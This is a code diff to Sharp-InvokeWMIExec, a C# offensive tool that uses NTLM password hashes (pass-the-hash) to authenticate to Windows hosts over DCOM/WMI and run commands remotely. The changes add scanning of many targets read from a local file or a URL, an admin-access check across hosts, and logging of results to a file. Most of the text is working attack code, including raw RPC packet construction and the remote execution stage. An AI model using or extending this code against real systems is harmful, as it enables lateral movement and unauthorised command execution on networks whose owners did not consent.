@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Net;
 using System.Threading;
 using System.Security.Cryptography;
@@ -7,6 +7,7 @@ using System.Net.Sockets;
 using System.Collections.Specialized;
 using System.Linq;
 using System.Text;
+using System.IO;
 
 namespace Sharp_InvokeWMIExec
 {
@@ -29,8 +30,11 @@ namespace Sharp_InvokeWMIExec
             bool debugging = false;
             string domain = "";
             string target = "";
-			bool show_help = false;
+            string outfile = "";
+            bool show_help = false;
             bool AdminCheck = false;
+
+            StringBuilder output = new StringBuilder();
 
             try
             {
@@ -71,12 +75,83 @@ namespace Sharp_InvokeWMIExec
                 {
                     target = arguments.Arguments["target"];
                 }
+                if (arguments.Arguments.ContainsKey("output"))
+                {
+                    outfile = arguments.Arguments["output"];
+                }
             }
             catch
             {
                 displayHelp("Error Parsing Arguments");
                 Environment.Exit(0);
             }
+
+            if (show_help)
+            {
+                displayHelp(null);
+                Environment.Exit(0);
+            }
+
+            if (string.IsNullOrEmpty(command))
+            {
+                AdminCheck = true;
+            }
+
+            if (!string.IsNullOrEmpty(hash) && !string.IsNullOrEmpty(username))
+            {
+                if (hash.Contains(":"))
+                    hash = hash.Split(':').Last();
+            }
+            else
+            {
+                displayHelp("Missing Required Params");
+                Environment.Exit(0);
+            }
+
+            if (target == "localhost")
+            {
+                target = "127.0.0.1";
+                doWMiStuff(debugging, AdminCheck, outfile, target, username, hash, domain, command, output);
+            }
+            else if (File.Exists(target))
+            {
+                string[] targets = File.ReadAllLines(target);
+
+                foreach (string computer in targets)
+                {
+                    target = computer;
+                    doWMiStuff(debugging, AdminCheck, outfile, target, username, hash, domain, command, output);
+                    output.Length = 0;
+                }
+            }
+            else if (target.ToLower().Contains("http"))
+            {
+                WebClient wc = new WebClient();
+                Stream stream = wc.OpenRead(target);
+                StreamReader sr = new StreamReader(stream);
+                string content = sr.ReadToEnd();
+                
+                string[] targets = content.Split(new string[] { "\r\n","\r","\n" }, StringSplitOptions.RemoveEmptyEntries);
+
+
+                foreach (string computer in targets)
+                {
+                    target = computer;
+                    doWMiStuff(debugging, AdminCheck, outfile, target, username, hash, domain, command, output);
+                    output.Length = 0;
+                }
+            }
+
+            else
+            {
+                doWMiStuff(debugging, AdminCheck, outfile, target, username, hash, domain, command, output);
+            }
+            Console.WriteLine("\n[!] Done!");
+        }
+
+        public static void doWMiStuff(bool debugging, bool AdminCheck, string outfile, string target, string username, string hash, string domain, string command, StringBuilder output)
+        {
+            bool writeOutput = false;
 
             string Target_Short = String.Empty;
             string processID = BitConverter.ToString(BitConverter.GetBytes(Process.GetCurrentProcess().Id)).Replace("-00-00", "").Replace("-", "");
@@ -87,7 +162,6 @@ namespace Sharp_InvokeWMIExec
             string WMI_Client_Stage = String.Empty;
             string WMI_Data = String.Empty;
             string OXID = String.Empty;
-            StringBuilder output = new StringBuilder();
             int Request_Split_Stage = 0;
             int Request_Length = 0;
             int Sequence_Number_Counter = 0;
@@ -119,43 +193,18 @@ namespace Sharp_InvokeWMIExec
             byte[] WMI_Namespace_Unicode = null;
             byte[] IPID2 = null;
 
-            if (show_help)
-			{
-				displayHelp(null);
-                Environment.Exit(0);
-			}
-
-			if (string.IsNullOrEmpty(command))
-            {
-                AdminCheck = true;
-            }
-
-            if (!string.IsNullOrEmpty(hash) && !string.IsNullOrEmpty(username))
-            {
-                if (hash.Contains(":"))
-                    hash = hash.Split(':').Last();
-            }
-            else
-            {
-                displayHelp("Missing Required Params");
-                Environment.Exit(0);
-            }
-
+            if (target == "127.0.0.1") Target_Long = "127.0.0.1";
 
             if (!string.IsNullOrEmpty(domain))
                 Output_Username = domain + '\\' + username;
             else
                 Output_Username = username;
-
-            if (target == "localhost")
-            {
-                target = "127.0.0.1";
-                Target_Long = "127.0.0.1";
-            }
+            
+            if (!string.IsNullOrEmpty(outfile)) writeOutput = true;
 
             try
             {
-                if (debugging) { output.AppendLine(String.Format("Connecting to: {0}", target)); }
+                if (debugging) { output.AppendLine(String.Format("[!] Connecting to: {0}", target)); }
                 Target_Type = IPAddress.Parse(target);
                 Target_Short = Target_Long = target;
             }
@@ -182,13 +231,14 @@ namespace Sharp_InvokeWMIExec
             }
             catch
             {
-                Console.WriteLine("No Response from: " + target);
-                Environment.Exit(0);
+                Console.WriteLine("[-] No Response from: " + target);
+                if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine("[-] No Response from: " + target);
+                return;
             }
 
             if (WMI_Client.Connected)
             {
-                if (debugging) { output.AppendLine(String.Format("Connected to: {0}", target)); }
+                if (debugging) { output.AppendLine(String.Format("[!] Connected to: {0}", target)); }
                 NetworkStream WMI_Client_Stream = WMI_Client.GetStream();
                 byte[] WMI_Client_Receive = new byte[2048];
                 byte[] RPC_UUID = new byte[] { 0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a };
@@ -203,7 +253,7 @@ namespace Sharp_InvokeWMIExec
                 WMI_HostName = Encoding.ASCII.GetString(WMI_Hostname_Bytes);
                 if (Target_Short != WMI_HostName)
                 {
-                    if (debugging) { output.AppendLine(String.Format("Switching target name to {0} due to initial response.", WMI_HostName)); }
+                    if (debugging) { output.AppendLine(String.Format("[!] Switching target name to {0} due to initial response.", WMI_HostName)); }
                     Target_Short = WMI_HostName;
                 }
                 WMI_Client.Close();
@@ -217,14 +267,16 @@ namespace Sharp_InvokeWMIExec
                 }
                 catch
                 {
-                    output.AppendLine(String.Format("No response from {0}", target));
+                    output.Append(String.Format("[-] No response from {0}", target));
                     Console.WriteLine(output.ToString());
+                    if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine(output.ToString());
+                    return;
                 }
 
                 if (WMI_Client.Connected)
                 {
-                    if (debugging) { output.AppendLine(String.Format("ReConnected to: {0} ", target)); }
-                    if (debugging) { output.AppendLine("Authenticating"); }
+                    if (debugging) { output.AppendLine(String.Format("[!] ReConnected to: {0} ", target)); }
+                    if (debugging) { output.AppendLine("[!] Authenticating"); }
                     WMI_Client_Stream = WMI_Client.GetStream();
                     RPC_UUID = new byte[] { 0xa0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 };
                     Packet_RPC = WMIExec.RPCBind(3, new byte[] { 0xd0, 0x16 }, new byte[] { 0x01 }, new byte[] { 0x01, 0x00 }, RPC_UUID, new byte[] { 0x00, 0x00 });
@@ -325,29 +377,32 @@ namespace Sharp_InvokeWMIExec
                     int OXID_Bytes_Index;
                     if (WMI_Client_Receive[2] == 3 && BitConverter.ToString(Utilities.GetByteRange(WMI_Client_Receive, 24, 27)) == "05-00-00-00")
                     {
-                        output.AppendLine("WMI Access Denied");
+                        output.Append(String.Format("[-] {0} WMI access denied on {1}", Output_Username, Target_Long));
                         Console.WriteLine(output.ToString());
-                        Environment.Exit(0);
+                        if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine(output.ToString());
+                        return;
                     }
                     else if (WMI_Client_Receive[2] == 3)
                     {
                         string Error_Code = BitConverter.ToString(new byte[] { WMI_Client_Receive[27], WMI_Client_Receive[26], WMI_Client_Receive[25], WMI_Client_Receive[24] });
                         string[] Error_Code_Array = Error_Code.Split('-');
                         Error_Code = string.Join("", Error_Code_Array);
-                        output.AppendLine(String.Format("Error Code: 0x{0}", Error_Code.ToString()));
+                        output.Append(String.Format("[-] Error Code: 0x{0}", Error_Code.ToString()));
                         Console.WriteLine(output.ToString());
-                        Environment.Exit(0);
+                        if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine(output.ToString());
+                        return;
                     }
                     else if (WMI_Client_Receive[2] == 2 && AdminCheck)
                     {
-                        output.AppendLine(String.Format("{0} is a local administrator on {1}", Output_Username, Target_Long));
-                        if (debugging) { output.AppendLine("Exiting due to AdminCheck being set"); }
+                        output.Append(String.Format("[+] {0} is a local administrator on {1}", Output_Username, Target_Long));
+                        if (debugging) { output.Append("[!] Exiting due to AdminCheck being set"); }
                         Console.WriteLine(output.ToString());
-                        Environment.Exit(0);
+                        if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine(output.ToString());
+                        return;
                     }
                     else if (WMI_Client_Receive[2] == 2 && !AdminCheck)
                     {
-                        if (debugging) { output.AppendLine("Continuing since AdminCheck is false"); }
+                        if (debugging) { output.Append("[!] Continuing since AdminCheck is false"); }
                         if (Target_Short == "127.0.0.1")
                         {
                             Target_Short = Auth_Hostname;
@@ -397,6 +452,7 @@ namespace Sharp_InvokeWMIExec
                             OXID_Bytes_Index = OXID_Index / 2;
                             Object_UUID = Utilities.GetByteRange(WMI_Client_Receive, OXID_Bytes_Index + 12, OXID_Bytes_Index + 27);
                         }
+
                         if (WMI_Random_Port_Int != 0)
                         {
                             try
@@ -405,28 +461,31 @@ namespace Sharp_InvokeWMIExec
                             }
                             catch
                             {
-                                output.AppendLine(String.Format("{0}:{1} did not respond", Target_Long, WMI_Random_Port_Int));
+                                output.Append(String.Format("[-] {0}:{1} did not respond", Target_Long, WMI_Random_Port_Int));
                                 Console.WriteLine(output.ToString());
-                                Environment.Exit(0);
+                                if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine(output.ToString());
+                                return;
                             }
                         }
                         else
                         {
-                            output.AppendLine(String.Format("Random port extraction failure"));
+                            output.Append(String.Format("[-] Random port extraction failure"));
                             Console.WriteLine(output.ToString());
-                            Environment.Exit(0);
+                            if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine(output.ToString());
+                            return;
                         }
                     }
                     else
                     {
-                        output.AppendLine("An Unkonwn Error Occured");
+                        output.Append("[-] An Unknown Error Occured");
                         Console.WriteLine(output.ToString());
-                        Environment.Exit(0);
+                        if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine(output.ToString());
+                        return;
                     }
 
                     if (WMI_Client_Random_Port.Connected)
                     {
-                        if (debugging) { output.AppendLine(String.Format("Connected to: {0} using port {1}", Target_Long, WMI_Random_Port_Int)); }
+                        if (debugging) { output.Append(String.Format("[!] Connected to: {0} using port {1}", Target_Long, WMI_Random_Port_Int)); }
                         NetworkStream WMI_Client_Random_Port_Stream = WMI_Client_Random_Port.GetStream();
                         Packet_RPC = WMIExec.RPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x03 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }, new byte[] { 0x00, 0x00 });
                         Packet_RPC["RPCBind_FragLength"] = new byte[] { 0xd0, 0x00 };
@@ -547,18 +606,20 @@ namespace Sharp_InvokeWMIExec
 
                         if (WMI_Client_Receive[2] == 3 && BitConverter.ToString(Utilities.GetByteRange(WMI_Client_Receive, 24, 27)) == "05-00-00-00")
                         {
-                            output.AppendLine(String.Format("{0} WMI access denied on {1}", Output_Username, Target_Long));
+                            output.Append(String.Format("[-] {0} WMI access denied on {1}", Output_Username, Target_Long));
                             Console.WriteLine(output.ToString());
-                            Environment.Exit(0);
+                            if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine(output.ToString());
+                            return;
                         }
                         else if (WMI_Client_Receive[2] == 3 && BitConverter.ToString(Utilities.GetByteRange(WMI_Client_Receive, 24, 27)) != "05-00-00-00")
                         {
                             string Error_Code = BitConverter.ToString(new byte[] { WMI_Client_Receive[27], WMI_Client_Receive[26], WMI_Client_Receive[25], WMI_Client_Receive[24] });
                             string[] Error_Code_Array = Error_Code.Split('-');
                             Error_Code = string.Join("", Error_Code_Array);
-                            output.AppendLine(String.Format("Error Code: 0x{0}", Error_Code.ToString()));
+                            output.Append(String.Format("[-] Error Code: 0x{0}", Error_Code.ToString()));
                             Console.WriteLine(output.ToString());
-                            Environment.Exit(0);
+                            if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine(output.ToString());
+                            return;
                         }
                         else if (WMI_Client_Receive[2] == 2)
                         {
@@ -570,9 +631,10 @@ namespace Sharp_InvokeWMIExec
                         }
                         else
                         {
-                            output.AppendLine("An Unkonwn Error Occured");
+                            output.Append("[-] An Unknown Error Occured");
                             Console.WriteLine(output.ToString());
-                            Environment.Exit(0);
+                            if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine(output.ToString());
+                            return;
                         }
 
                         //Moving on to Command Execution
@@ -582,13 +644,13 @@ namespace Sharp_InvokeWMIExec
 
                         while (WMI_Client_Stage != "exit")
                         {
-                            if (debugging) { output.AppendLine(WMI_Client_Stage); }
+                            if (debugging) { output.Append(WMI_Client_Stage); }
                             if (WMI_Client_Receive[2] == 3)
                             {
                                 string Error_Code = BitConverter.ToString(new byte[] { WMI_Client_Receive[27], WMI_Client_Receive[26], WMI_Client_Receive[25], WMI_Client_Receive[24] });
                                 string[] Error_Code_Array = Error_Code.Split('-');
                                 Error_Code = string.Join("", Error_Code_Array);
-                                output.AppendLine(String.Format("Execution failed with error code: 0x{0}", Error_Code.ToString()));
+                                output.Append(String.Format("[-] Execution failed with error code: 0x{0}", Error_Code.ToString()));
                                 WMI_Client_Stage = "exit";
                             }
 
@@ -745,7 +807,6 @@ namespace Sharp_InvokeWMIExec
                                                     Packet_Rem_Query_Interface = WMIExec.DCOMRemQueryInterface(Causality_ID_Bytes, IPID2, new byte[] { 0x9e, 0xc1, 0xfc, 0xc3, 0x70, 0xa9, 0xd2, 0x11, 0x8b, 0x5a, 0x00, 0xa0, 0xc9, 0xb7, 0xc9, 0xc4 });
                                                     Stub_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_Rem_Query_Interface);
 
-
                                                 }
                                                 break;
                                             case 5:
@@ -888,8 +949,6 @@ namespace Sharp_InvokeWMIExec
                                                                 WMI_Client_Stage_Next = "Request";
                                                             }
                                                         }
-
-
                                                     }
 
                                                 }
@@ -943,7 +1002,6 @@ namespace Sharp_InvokeWMIExec
                                             Target_Process_ID = Utilities.DataLength(1141, WMI_Client_Receive);
                                             success = true;
                                         }
-
                                         WMI_Client_Stage = "exit";
                                     }
                                     break;
@@ -957,21 +1015,35 @@ namespace Sharp_InvokeWMIExec
                 WMI_Client.Close();
                 WMI_Client_Stream.Close();
             }
+
             if (success)
             {
-                output.AppendLine(String.Format("Command executed with process ID {0} on {1}", Target_Process_ID, Target_Long));
+                output.Append(String.Format("[+] Command: \"{0}\" executed with process ID {1} on {2}",command, Target_Process_ID, Target_Long));
             }
             else
             {
-                output.AppendLine("Process did not start, check your command");
+                output.Append("[-] Process did not start, check your command");
             }
+
             Console.WriteLine(output.ToString());
+            if (writeOutput) using (StreamWriter sw = File.AppendText(outfile)) sw.WriteLine(output.ToString());
         }
 
         //Begin Helper Functions.
         public static void displayHelp(string message)
         {
-            Console.WriteLine("{0} \r\nSharp-InvokeWMIExec.exe username:<user> domain:<domain>  hash:<ntlm> target:<target> command:<command>", message);
+            Console.WriteLine("\n[!] Usage: Sharp-WMIExec.exe username:<user> domain:<domain> hash:<ntlm> target:<target/file> command:<command> output:<outputFile.txt>\n");
+            Console.WriteLine("Option\t\tDescription");
+            Console.WriteLine("USERNAME\tUsername to use for authentication\n");
+            Console.WriteLine("HASH\t\tNTLM Password hash for authentication. This module will accept either LM:NTLM or NTLM format\n");
+            Console.WriteLine("DOMAIN\t\t(optional) Domain to use for authentication. This parameter is not needed\n\t\twith local accounts or when using @domain after the username\n");
+            Console.WriteLine("TARGET\t\tHostname/IP Address of the target or a file containg hostnames/IPs.\n\t\tFile can be grabbed via UNC or from a web server.\n");
+            Console.WriteLine("COMMAND\t\t(optional) Command to execute on the target. If a command is not specified,\n\t\tthe function will check to see if the username and hash provide local admin\n\t\taccess on the target\n");
+            Console.WriteLine("OUTPUT\t\t(optional) File to save results to. Results are appended if file exists");
+            Console.WriteLine("");
+            Console.WriteLine("-CheckAdmin\tCheck admin access only, don't execute command [True if command not given]\n");
+            Console.WriteLine("-Debug\t\tSwitch, Enabled debugging [Default='False']\n");
+
             Environment.Exit(-1);
         }
     }
